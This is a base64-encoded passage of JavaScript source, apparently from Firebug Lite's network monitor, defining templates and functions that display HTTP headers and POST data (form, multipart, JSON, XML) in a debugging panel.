cmNlOw0KDQogICAgICAgIHZpZXdTb3VyY2UgPSAkJCgiLnJlcXVlc3QiLCByb290Tm9kZSlbMF07DQogICAgICAgIC8vdmlld1NvdXJjZSA9IHJvb3ROb2RlLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEhlYWRlcnNWaWV3U291cmNlIHJlcXVlc3QiKS5pdGVtKDApOw0KICAgICAgICBpZiAoZmlsZS5yZXF1ZXN0SGVhZGVyc1RleHQpDQogICAgICAgICAgICByZW1vdmVDbGFzcyh2aWV3U291cmNlLCAiY29sbGFwc2VkIik7DQoNCiAgICAgICAgdmlld1NvdXJjZSA9ICQkKCIucmVzcG9uc2UiLCByb290Tm9kZSlbMF07DQogICAgICAgIC8vdmlld1NvdXJjZSA9IHJvb3ROb2RlLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEhlYWRlcnNWaWV3U291cmNlIHJlc3BvbnNlIikuaXRlbSgwKTsNCiAgICAgICAgaWYgKGZpbGUucmVzcG9uc2VIZWFkZXJzVGV4dCkNCiAgICAgICAgICAgIHJlbW92ZUNsYXNzKHZpZXdTb3VyY2UsICJjb2xsYXBzZWQiKTsNCiAgICB9LA0KDQogICAgcmVuZGVySGVhZGVyczogZnVuY3Rpb24ocGFyZW50LCBoZWFkZXJzLCByb3dOYW1lKQ0KICAgIHsNCiAgICAgICAgaWYgKCFwYXJlbnQuZmlyc3RDaGlsZCkNCiAgICAgICAgICAgIHRoaXMuaW5pdChwYXJlbnQpOw0KDQogICAgICAgIHRoaXMuaW5zZXJ0SGVhZGVyUm93cyhwYXJlbnQsIGhlYWRlcnMsIHJvd05hbWUpOw0KICAgIH0NCn0pOw0KDQp2YXIgTmV0SW5mb0hlYWRlcnMgPSBGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb0hlYWRlcnM7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovKioNCiAqIEBkb21wbGF0ZSBSZXByZXNlbnRzIHBvc3RlZCBkYXRhIHdpdGhpbiByZXF1ZXN0IGluZm8gKHRoZSBpbmZvLCB3aGljaCBpcyB2aXNpYmxlIHdoZW4NCiAqIGEgcmVxdWVzdCBlbnRyeSBpcyBleHBhbmRlZC4gVGhpcyB0ZW1wbGF0ZSByZW5kZXJzIGNvbnRlbnQgb2YgdGhlIFBvc3QgdGFiLg0KICovDQpGaXJlYnVnLk5ldE1vbml0b3IuTmV0SW5mb1Bvc3REYXRhID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsIC8qbmV3IEZpcmVidWcuTGlzdGVuZXIoKSwqLw0Kew0KICAgIC8vIGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KICAgIHBhcmFtc1RhYmxlOg0KICAgICAgICBUQUJMRSh7ImNsYXNzIjogIm5ldEluZm9Qb3N0UGFyYW1zVGFibGUiLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgVEJPRFkoeyJyb2xlIjogImxpc3QiLCAiYXJpYS1sYWJlbCI6ICRTVFIoIm5ldC5sYWJlbC5QYXJhbWV0ZXJzIil9LA0KICAgICAgICAgICAgICAgIFRSKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RQYXJhbXNUaXRsZSIsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgICAgICAgICBURCh7Y29sc3BhbjogMywgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFBhcmFtcyJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTVFIoIm5ldC5sYWJlbC5QYXJhbWV0ZXJzIiksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIm5ldEluZm9Qb3N0Q29udGVudFR5cGUifSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApDQogICAgICAgICksDQoNCiAgICAvLyBtdWx0aXBhcnQvZm9ybS1kYXRhDQogICAgcGFydHNUYWJsZToNCiAgICAgICAgVEFCTEUoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFBhcnRzVGFibGUiLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgVEJPRFkoeyJyb2xlIjogImxpc3QiLCAiYXJpYS1sYWJlbCI6ICRTVFIoIm5ldC5sYWJlbC5QYXJ0cyIpfSwNCiAgICAgICAgICAgICAgICBUUih7ImNsYXNzIjogIm5ldEluZm9Qb3N0UGFydHNUaXRsZSIsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgICAgICAgICBURCh7Y29sc3BhbjogMiwgInJvbGUiOiJwcmVzZW50YXRpb24iIH0sDQogICAgICAgICAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFBhcmFtcyJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTVFIoIm5ldC5sYWJlbC5QYXJ0cyIpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJuZXRJbmZvUG9zdENvbnRlbnRUeXBlIn0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJtdWx0aXBhcnQvZm9ybS1kYXRhIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIC8vIGFwcGxpY2F0aW9uL2pzb24NCiAgICBqc29uVGFibGU6DQogICAgICAgIFRBQkxFKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RKU09OVGFibGUiLCBjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDAsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgLy8vVEJPRFkoeyJyb2xlIjogImxpc3QiLCAiYXJpYS1sYWJlbCI6ICRTVFIoImpzb252aWV3ZXIudGFiLkpTT04iKX0sDQogICAgICAgICAgICBUQk9EWSh7InJvbGUiOiAibGlzdCIsICJhcmlhLWxhYmVsIjogJFNUUigiSlNPTiIpfSwNCiAgICAgICAgICAgICAgICBUUih7ImNsYXNzIjogIm5ldEluZm9Qb3N0SlNPTlRpdGxlIiwgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICAgICAgICAgIFREKHsicm9sZSI6ICJwcmVzZW50YXRpb24iIH0sDQogICAgICAgICAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFBhcmFtcyJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vLyRTVFIoImpzb252aWV3ZXIudGFiLkpTT04iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTVFIoIkpTT04iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICAgICBUUigNCiAgICAgICAgICAgICAgICAgICAgVEQoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdEpTT05Cb2R5In0pDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgLy8gYXBwbGljYXRpb24veG1sDQogICAgeG1sVGFibGU6DQogICAgICAgIFRBQkxFKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RYTUxUYWJsZSIsIGNlbGxwYWRkaW5nOiAwLCBjZWxsc3BhY2luZzogMCwgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICBUQk9EWSh7InJvbGUiOiAibGlzdCIsICJhcmlhLWxhYmVsIjogJFNUUigieG1sdmlld2VyLnRhYi5YTUwiKX0sDQogICAgICAgICAgICAgICAgVFIoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFhNTFRpdGxlIiwgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICAgICAgICAgIFREKHsicm9sZSI6ICJwcmVzZW50YXRpb24iIH0sDQogICAgICAgICAgICAgICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJuZXRJbmZvUG9zdFBhcmFtcyJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTVFIoInhtbHZpZXdlci50YWIuWE1MIikNCiAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICksDQogICAgICAgICAgICAgICAgVFIoDQogICAgICAgICAgICAgICAgICAgIFREKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RYTUxCb2R5In0pDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgc291cmNlVGFibGU6DQogICAgICAgIFRBQkxFKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RTb3VyY2VUYWJsZSIsIGNlbGxwYWRkaW5nOiAwLCBjZWxsc3BhY2luZzogMCwgInJvbGUiOiAicHJlc2VudGF0aW9uIn0sDQogICAgICAgICAgICBUQk9EWSh7InJvbGUiOiAibGlzdCIsICJhcmlhLWxhYmVsIjogJFNUUigibmV0LmxhYmVsLlNvdXJjZSIpfSwNCiAgICAgICAgICAgICAgICBUUih7ImNsYXNzIjogIm5ldEluZm9Qb3N0U291cmNlVGl0bGUiLCAicm9sZSI6ICJwcmVzZW50YXRpb24ifSwNCiAgICAgICAgICAgICAgICAgICAgVEQoe2NvbHNwYW46IDIsICJyb2xlIjogInByZXNlbnRhdGlvbiJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAibmV0SW5mb1Bvc3RTb3VyY2UifSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU1RSKCJuZXQubGFiZWwuU291cmNlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICkNCiAgICAgICAgKSwNCg0KICAgIHNvdXJjZUJvZHlUYWc6DQogICAgICAgIFRSKHsicm9sZSI6ICJwcmVzZW50YXRpb24ifSwNCiAgICAgICAgICAgIFREKHtjb2xzcGFuOiAyLCAicm9sZSI6ICJwcmVzZW50YXRpb24ifSwNCiAgICAgICAgICAgICAgICBGT1IoImxpbmUiLCAiJHBhcmFtfGdldFBhcmFtVmFsdWVJdGVyYXRvciIsDQogICAgICAgICAgICAgICAgICAgIENPREUoeyJjbGFzcyI6ImZvY3VzUm93IHN1YkZvY3VzUm93IiAsICJyb2xlIjogImxpc3RpdGVtIn0sIiRsaW5lIikNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApDQogICAgICAgICksDQoNCiAgICBnZXRQYXJhbVZhbHVlSXRlcmF0b3I6IGZ1bmN0aW9uKHBhcmFtKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIE5ldEluZm9Cb2R5LmdldFBhcmFtVmFsdWVJdGVyYXRvcihwYXJhbSk7DQogICAgfSwNCg0KICAgIHJlbmRlcjogZnVuY3Rpb24oY29udGV4dCwgcGFyZW50Tm9kZSwgZmlsZSkNCiAgICB7DQogICAgICAgIC8vZGVidWdnZXI7DQogICAgICAgIHZhciBzcHkgPSBnZXRBbmNlc3RvckJ5Q2xhc3MocGFyZW50Tm9kZSwgInNweUhlYWQiKTsNCiAgICAgICAgdmFyIHNweU9iamVjdCA9IHNweS5yZXBPYmplY3Q7DQogICAgICAgIHZhciBkYXRhID0gc3B5T2JqZWN0LmRhdGE7DQogICAgICAgIA0KICAgICAgICAvLy92YXIgY29udGVudFR5cGUgPSBVdGlscy5maW5kSGVhZGVyKGZpbGUucmVxdWVzdEhlYWRlcnMsICJjb250ZW50LXR5cGUiKTsNCiAgICAgICAgdmFyIGNvbnRlbnRUeXBlID0gZmlsZS5taW1lVHlwZTsNCiAgICAgICAgDQogICAgICAgIC8vL3ZhciB0ZXh0ID0gVXRpbHMuZ2V0UG9zdFRleHQoZmlsZSwgY29udGV4dCwgdHJ1ZSk7DQogICAgICAgIC8vL2lmICh0ZXh0ID09IHVuZGVmaW5lZCkNCiAgICAgICAgLy8vICAgIHJldHVybjsNCg0KICAgICAgICAvLy9pZiAoVXRpbHMuaXNVUkxFbmNvZGVkUmVxdWVzdChmaWxlLCBjb250ZXh0KSkNCiAgICAgICAgLy8gZmFrZSBVdGlscy5pc1VSTEVuY29kZWRSZXF1ZXN0IGlkZW50aWZpY2F0aW9uDQogICAgICAgIGlmIChjb250ZW50VHlwZSAmJiBjb250ZW50VHlwZSA9PSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiB8fA0KICAgICAgICAgICAgZGF0YSAmJiBkYXRhLmluZGV4T2YoIj0iKSAhPSAtMSkgDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vL3ZhciBsaW5lcyA9IHRleHQuc3BsaXQoIlxuIik7DQogICAgICAgICAgICAvLy92YXIgcGFyYW1zID0gcGFyc2VVUkxFbmNvZGVkVGV4dChsaW5lc1tsaW5lcy5sZW5ndGgtMV0pOw0KICAgICAgICAgICAgdmFyIHBhcmFtcyA9IHBhcnNlVVJMRW5jb2RlZFRleHRBcnJheShkYXRhKTsNCiAgICAgICAgICAgIGlmIChwYXJhbXMpDQogICAgICAgICAgICAgICAgdGhpcy5pbnNlcnRQYXJhbWV0ZXJzKHBhcmVudE5vZGUsIHBhcmFtcyk7DQogICAgICAgIH0NCg0KICAgICAgICAvLy9pZiAoVXRpbHMuaXNNdWx0aVBhcnRSZXF1ZXN0KGZpbGUsIGNvbnRleHQpKQ0KICAgICAgICAvLy97DQogICAgICAgIC8vLyAgICB2YXIgZGF0YSA9IHRoaXMucGFyc2VNdWx0aVBhcnRUZXh0KGZpbGUsIGNvbnRleHQpOw0KICAgICAgICAvLy8gICAgaWYgKGRhdGEpDQogICAgICAgIC8vLyAgICAgICAgdGhpcy5pbnNlcnRQYXJ0cyhwYXJlbnROb2RlLCBkYXRhKTsNCiAgICAgICAgLy8vfQ0KDQogICAgICAgIC8vIG1vdmVkIHRvIHRoZSB0b3ANCiAgICAgICAgLy8vdmFyIGNvbnRlbnRUeXBlID0gVXRpbHMuZmluZEhlYWRlcihmaWxlLnJlcXVlc3RIZWFkZXJzLCAiY29udGVudC10eXBlIik7DQoNCiAgICAgICAgLy8vaWYgKEZpcmVidWcuSlNPTlZpZXdlck1vZGVsLmlzSlNPTihjb250ZW50VHlwZSkpDQogICAgICAgIHZhciBqc29uRGF0YSA9IHsNCiAgICAgICAgICAgIHJlc3BvbnNlVGV4dDogZGF0YQ0KICAgICAgICB9Ow0KICAgICAgICANCiAgICAgICAgaWYgKEZpcmVidWcuSlNPTlZpZXdlck1vZGVsLmlzSlNPTihjb250ZW50VHlwZSwgZGF0YSkpDQogICAgICAgICAgICAvLy90aGlzLmluc2VydEpTT04ocGFyZW50Tm9kZSwgZmlsZSwgY29udGV4dCk7DQogICAgICAgICAgICB0aGlzLmluc2VydEpTT04ocGFyZW50Tm9kZSwganNvbkRhdGEsIGNvbnRleHQpOw0KDQogICAgICAgIC8vL2lmIChGaXJlYnVnLlhNTFZpZXdlck1vZGVsLmlzWE1MKGNvbnRlbnRUeXBlKSkNCiAgICAgICAgLy8vICAgIHRoaXMuaW5zZXJ0WE1MKHBhcmVudE5vZGUsIGZpbGUsIGNvbnRleHQpOw0KDQogICAgICAgIC8vL3ZhciBwb3N0VGV4dCA9IFV0aWxzLmdldFBvc3RUZXh0KGZpbGUsIGNvbnRleHQpOw0KICAgICAgICAvLy9wb3N0VGV4dCA9IFV0aWxzLmZvcm1hdFBvc3RUZXh0KHBvc3RUZXh0KTsNCiAgICAgICAgdmFyIHBvc3RUZXh0ID0gZGF0YTsNCiAgICAgICAgaWYgKHBvc3RUZXh0KQ0KICAgICAgICAgICAgdGhpcy5pbnNlcnRTb3VyY2UocGFyZW50Tm9kZSwgcG9zdFRleHQpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRQYXJhbWV0ZXJzOiBmdW5jdGlvbihwYXJlbnROb2RlLCBwYXJhbXMpDQogICAgew0KICAgICAgICBpZiAoIXBhcmFtcyB8fCAhcGFyYW1zLmxlbmd0aCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgcGFyYW1UYWJsZSA9IHRoaXMucGFyYW1zVGFibGUuYXBwZW5kKHtvYmplY3Q6e319LCBwYXJlbnROb2RlKTsNCiAgICAgICAgdmFyIHJvdyA9ICQkKCIubmV0SW5mb1Bvc3RQYXJhbXNUaXRsZSIsIHBhcmFtVGFibGUpWzBdOw0KICAgICAgICAvL3ZhciBwYXJhbVRhYmxlID0gdGhpcy5wYXJhbXNUYWJsZS5hcHBlbmQobnVsbCwgcGFyZW50Tm9kZSk7DQogICAgICAgIC8vdmFyIHJvdyA9IHBhcmFtVGFibGUuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb1Bvc3RQYXJhbXNUaXRsZSIpLml0ZW0oMCk7DQogICAgICAgIA0KICAgICAgICB2YXIgdGJvZHkgPSBwYXJhbVRhYmxlLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJ0Ym9keSIpWzBdOw0KICAgICAgICANCiAgICAgICAgTmV0SW5mb0JvZHkuaGVhZGVyRGF0YVRhZy5pbnNlcnRSb3dzKHtoZWFkZXJzOiBwYXJhbXN9LCByb3cpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRQYXJ0czogZnVuY3Rpb24ocGFyZW50Tm9kZSwgZGF0YSkNCiAgICB7DQogICAgICAgIGlmICghZGF0YS5wYXJhbXMgfHwgIWRhdGEucGFyYW1zLmxlbmd0aCkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICB2YXIgcGFydHNUYWJsZSA9IHRoaXMucGFydHNUYWJsZS5hcHBlbmQoe29iamVjdDp7fX0sIHBhcmVudE5vZGUpOw0KICAgICAgICB2YXIgcm93ID0gJCQoIi5uZXRJbmZvUG9zdFBhcnRzVGl0bGUiLCBwYXJhbVRhYmxlKVswXTsNCiAgICAgICAgLy92YXIgcGFydHNUYWJsZSA9IHRoaXMucGFydHNUYWJsZS5hcHBlbmQobnVsbCwgcGFyZW50Tm9kZSk7DQogICAgICAgIC8vdmFyIHJvdyA9IHBhcnRzVGFibGUuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgibmV0SW5mb1Bvc3RQYXJ0c1RpdGxlIikuaXRlbSgwKTsNCg0KICAgICAgICBOZXRJbmZvQm9keS5oZWFkZXJEYXRhVGFnLmluc2VydFJvd3Moe2hlYWRlcnM6IGRhdGEucGFyYW1zfSwgcm93KTsNCiAgICB9LA0KDQogICAgaW5zZXJ0SlNPTjogZnVuY3Rpb24ocGFyZW50Tm9kZSwgZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIC8vL3ZhciB0ZXh0ID0gVXRpbHMuZ2V0UG9zdFRleHQoZmlsZSwgY29udGV4dCk7DQogICAgICAgIHZhciB0ZXh0ID0gZmlsZS5yZXNwb25zZVRleHQ7DQogICAgICAgIC8vL3ZhciBkYXRhID0gcGFyc2VKU09OU3RyaW5nKHRleHQsICJodHRwOi8vIiArIGZpbGUucmVxdWVzdC5vcmlnaW5hbFVSSS5ob3N0KTsNCiAgICAgICAgdmFyIGRhdGEgPSBwYXJzZUpTT05TdHJpbmcodGV4dCk7DQogICAgICAgIGlmICghZGF0YSkNCiAgICAgICAgICAgIHJldHVybjsNCg0KICAgICAgICAvLy92YXIganNvblRhYmxlID0gdGhpcy5qc29uVGFibGUuYXBwZW5kKG51bGwsIHBhcmVudE5vZGUpOw0KICAgICAgICB2YXIganNvblRhYmxlID0gdGhpcy5qc29uVGFibGUuYXBwZW5kKHt9LCBwYXJlbnROb2RlKTsNCiAgICAgICAgLy8vdmFyIGpzb25Cb2R5ID0ganNvblRhYmxlLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEluZm9Qb3N0SlNPTkJvZHkiKS5pdGVtKDApOw0KICAgICAgICB2YXIganNvbkJvZHkgPSAkJCgiLm5ldEluZm9Qb3N0SlNPTkJvZHkiLCBqc29uVGFibGUpWzBdOw0KDQogICAgICAgIGlmICghdGhpcy50b2dnbGVzKQ0KICAgICAgICAgICAgdGhpcy50b2dnbGVzID0ge307DQoNCiAgICAgICAgRmlyZWJ1Zy5ET01QYW5lbC5EaXJUYWJsZS50YWcucmVwbGFjZSgNCiAgICAgICAgICAgIHtvYmplY3Q6IGRhdGEsIHRvZ2dsZXM6IHRoaXMudG9nZ2xlc30sIGpzb25Cb2R5KTsNCiAgICB9LA0KDQogICAgaW5zZXJ0WE1MOiBmdW5jdGlvbihwYXJlbnROb2RlLCBmaWxlLCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgdmFyIHRleHQgPSBVdGlscy5nZXRQb3N0VGV4dChmaWxlLCBjb250ZXh0KTsNCg0KICAgICAgICB2YXIganNvblRhYmxlID0gdGhpcy54bWxUYWJsZS5hcHBlbmQobnVsbCwgcGFyZW50Tm9kZSk7DQogICAgICAgIC8vL3ZhciBqc29uQm9keSA9IGpzb25UYWJsZS5nZXRFbGVtZW50c0J5Q2xhc3NOYW1lKCJuZXRJbmZvUG9zdFhNTEJvZHkiKS5pdGVtKDApOw0KICAgICAgICB2YXIganNvbkJvZHkgPSAkJCgiLm5ldEluZm9Qb3N0WE1MQm9keSIsIGpzb25UYWJsZSlbMF07DQoNCiAgICAgICAgRmlyZWJ1Zy5YTUxWaWV3ZXJNb2RlbC5pbnNlcnRYTUwoanNvbkJvZHksIHRleHQpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRTb3VyY2U6IGZ1bmN0aW9uKHBhcmVudE5vZGUsIHRleHQpDQogICAgew0KICAgICAgICB2YXIgc291cmNlVGFibGUgPSB0aGlzLnNvdXJjZVRhYmxlLmFwcGVuZCh7b2JqZWN0Ont9fSwgcGFyZW50Tm9kZSk7DQogICAgICAgIHZhciByb3cgPSAkJCgiLm5ldEluZm9Qb3N0U291cmNlVGl0bGUiLCBzb3VyY2VUYWJsZSlbMF07DQogICAgICAgIC8vdmFyIHNvdXJjZVRhYmxlID0gdGhpcy5zb3VyY2VUYWJsZS5hcHBlbmQobnVsbCwgcGFyZW50Tm9kZSk7DQogICAgICAgIC8vdmFyIHJvdyA9IHNvdXJjZVRhYmxlLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoIm5ldEluZm9Qb3N0U291cmNlVGl0bGUiKS5pdGVtKDApOw0KDQogICAgICAgIHZhciBwYXJhbSA9IHt2YWx1ZTogW3RleHRdfTsNCiAgICAgICAgdGhpcy5zb3VyY2VCb2R5VGFnLmluc2VydFJvd3Moe3BhcmFtOiBwYXJhbX0sIHJvdyk7DQogICAgfSwNCg0KICAgIHBhcnNlTXVsdGlQYXJ0VGV4dDogZnVuY3Rpb24oZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB0ZXh0ID0gVXRpbHMuZ2V0UG9zdFRleHQoZmlsZSwgY29udGV4dCk7DQogICAgICAgIGlmICh0ZXh0ID09IHVuZGVmaW5lZCkNCiAgICAgICAgICAgIHJldHVybiBudWxsOw0KDQogICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJuZXQucGFyc2VNdWx0aVBhcnRUZXh0OyBib3VuZGFyeTogIiwgdGV4dCk7DQoNCiAgICAgICAgdmFyIGJvdW5kYXJ5ID0gdGV4dC5tYXRjaCgvXHMqYm91bmRhcnk9XHMqKC4qKS8pWzFdOw0KDQogICAgICAgIHZhciBkaXZpZGVyID0gIlxyXG5cclxuIjsNCiAgICAgICAgdmFyIGJvZHlTdGFydCA9IHRleHQuaW5kZXhPZihkaXZpZGVyKTsNCiAgICAgICAgdmFyIGJvZHkgPSB0ZXh0LnN1YnN0cihib2R5U3RhcnQgKyBkaXZpZGVyLmxlbmd0aCk7DQoNCiAgICAgICAgdmFyIHBvc3REYXRhID0ge307DQogICAgICAgIHBvc3REYXRhLm1pbWVUeXBlID0gIm11bHRpcGFydC9mb3JtLWRhdGEiOw0KICAgICAgICBwb3N0RGF0YS5wYXJhbXMgPSBbXTsNCg0KICAgICAgICB2YXIgcGFydHMgPSBib2R5LnNwbGl0KCItLSIgKyBib3VuZGFyeSk7DQogICAgICAgIGZvciAodmFyIGk9MDsgaTxwYXJ0cy5sZW5ndGg7IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhcnQgPSBwYXJ0c1tpXS5zcGxpdChkaXZpZGVyKTsNCiAgICAgICAgICAgIGlmIChwYXJ0Lmxlbmd0aCAhPSAyKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICB2YXIgbSA9IHBhcnRbMF0ubWF0Y2goL1xzKm5hbWU9XCIoLiopXCIoO3wkKS8pOw0KICAgICAgICAgICAgcG9zdERhdGEucGFyYW1zLnB1c2goew0KICAgICAgICAgICAgICAgIG5hbWU6IChtICYmIG0ubGVuZ3RoID4gMSkgPyBtWzFdIDogIiIsDQogICAgICAgICAgICAgICAgdmFsdWU6IHRyaW0ocGFydFsxXSkNCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIHBvc3REYXRhOw0KICAgIH0NCn0pOw0KDQp2YXIgTmV0SW5mb1Bvc3REYXRhID0gRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldEluZm9Qb3N0RGF0YTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCg0KLy8gVE9ETzogeHh4cGVkcm8gbmV0IGkxOG4NCnZhciAkU1RSUCA9IGZ1bmN0aW9uKGEpe3JldHVybiBhO307DQoNCkZpcmVidWcuTmV0TW9uaXRvci5OZXRMaW1pdCA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIGNvbGxhcHNlZDogdHJ1ZSwNCg0KICAgIHRhYmxlVGFnOg0KICAgICAgICBESVYoDQogICAgICAgICAgICBUQUJMRSh7d2lkdGg6ICIxMDAlIiwgY2VsbHBhZGRpbmc6IDAsIGNlbGxzcGFjaW5nOiAwfSwNCiAgICAgICAgICAgICAgICBUQk9EWSgpDQogICAgICAgICAgICApDQogICAgICAgICksDQoNCiAgICBsaW1pdFRhZzoNCiAgICAgICAgVFIoeyJjbGFzcyI6ICJuZXRSb3cgbmV0TGltaXRSb3ciLCAkY29sbGFwc2VkOiAiJGlzQ29sbGFwc2VkIn0sDQogICAgICAgICAgICBURCh7ImNsYXNzIjogIm5ldENvbCBuZXRMaW1pdENvbCIsIGNvbHNwYW46IDZ9LA0KICAgICAgICAgICAgICAgIFRBQkxFKHtjZWxscGFkZGluZzogMCwgY2VsbHNwYWNpbmc6IDB9LA0KICAgICAgICAgICAgICAgICAgICBUQk9EWSgNCiAgICAgICAgICAgICAgICAgICAgICAgIFRSKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFREKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAibmV0TGltaXRMYWJlbCJ9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNUUlAoInBsdXJhbC5MaW1pdF9FeGNlZWRlZCIsIFswXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVEQoe3N0eWxlOiAid2lkdGg6MTAwJSJ9KSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBURCgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQlVUVE9OKHsiY2xhc3MiOiAibmV0TGltaXRCdXR0b24iLCB0aXRsZTogIiRsaW1pdFByZWZzVGl0bGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb25jbGljazogIiRvblByZWZlcmVuY2VzIn0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNUUigiTGltaXRQcmVmcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFREKCImbmJzcDsiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgKQ0KICAgICAgICApLA0KDQogICAgaXNDb2xsYXBzZWQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmNvbGxhcHNl